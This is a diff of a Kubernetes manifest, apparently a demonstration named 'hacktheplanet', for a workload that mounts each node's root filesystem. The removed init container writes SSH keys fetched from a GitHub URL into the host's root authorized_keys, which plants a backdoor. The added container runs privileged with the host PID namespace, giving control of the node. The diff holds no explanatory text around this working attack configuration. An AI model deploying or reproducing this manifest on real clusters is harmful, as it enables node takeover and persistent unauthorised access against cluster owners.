@@ -11,6 +11,7 @@ spec:
       labels:
         app: hacktheplanet
     spec:
+      hostPID: true
       volumes:
       - name: root
         hostPath:
@@ -18,7 +19,7 @@ spec:
       tolerations:
       - effect: NoSchedule
         operator: Exists
-      initContainers:
+      containers:
       - name: hacktheplanet
         image: alpine
         volumeMounts:
@@ -27,8 +28,9 @@ spec:
         command:
         - sh
         - -c
-        - "mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys > /root/.ssh/authorized_keys"
-      containers:
+        - sleep infinity
+        securityContext:
+          privileged: true
       - name: web
         image: nginx
 
